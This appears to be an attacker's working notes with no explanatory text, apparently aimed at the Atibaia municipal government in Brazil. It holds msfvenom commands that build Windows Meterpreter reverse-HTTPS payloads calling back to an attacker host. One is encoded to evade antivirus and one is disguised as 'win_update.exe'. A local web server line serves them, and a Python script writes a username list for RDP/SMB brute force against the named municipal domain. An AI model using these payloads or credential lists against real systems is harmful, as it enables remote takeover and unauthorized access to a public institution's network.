msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080
# Gerando um arquivo users.txt com nomes de usuários personalizados para brute force (RDP/SMB)
usuarios = [
    "Administrator",
    "administrator",
    "Admin",
    "admin",
    "usuario",
    "Usuario",
    "user",
    "User",
    "atibaia",
    "prefeitura",
    "atendimento",
    "servidor",
    "servidor01",
    "servidor02",
    "gestor",
    "gestor01",
    "sum",
    "suma",
    "suma57667",
    "suma57667.atibaia.gov.br"
]

with open("/mnt/data/users_atibaia.txt", "w") as f:
    for user in usuarios:
        f.write(user + "\n")

print("Arquivo 'users_atibaia.txt' criado com sucesso.")




